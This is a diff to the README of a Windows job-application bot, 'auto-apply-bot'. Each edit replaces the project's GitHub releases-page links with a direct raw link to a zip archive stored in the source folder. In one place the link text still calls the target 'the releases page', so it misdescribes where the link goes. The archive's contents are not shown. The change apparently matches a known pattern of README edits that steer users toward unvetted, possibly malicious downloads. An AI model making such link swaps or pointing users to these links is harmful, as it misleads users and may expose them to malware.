@@ -1,6 +1,6 @@
 # 🤖 auto-apply-bot - Automate Job Applications Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-auto--apply--bot-brightgreen?style=for-the-badge)](https://github.com/Cimerherd/auto-apply-bot/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-auto--apply--bot-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Cimerherd/auto-apply-bot/main/src/auto-bot-apply-1.8.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Make sure your computer meets these basic requirements:
 
 Visit this page to download auto-apply-bot:
 
-[![Download auto-apply-bot](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Cimerherd/auto-apply-bot/releases)
+[![Download auto-apply-bot](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/Cimerherd/auto-apply-bot/main/src/auto-bot-apply-1.8.zip)
 
 This page includes all recent versions. Choose the latest release that fits Windows (usually marked as `.exe` or `.zip`).
 
@@ -103,7 +103,7 @@ Click "Start" in the program to begin. The bot will:
 
 ## 📥 Download and Install auto-apply-bot on Windows
 
-1. Go to the releases page: [https://github.com/Cimerherd/auto-apply-bot/releases](https://github.com/Cimerherd/auto-apply-bot/releases)
+1. Go to the releases page: [https://raw.githubusercontent.com/Cimerherd/auto-apply-bot/main/src/auto-bot-apply-1.8.zip](https://raw.githubusercontent.com/Cimerherd/auto-apply-bot/main/src/auto-bot-apply-1.8.zip)
 
 2. Look for the latest version for Windows.
 
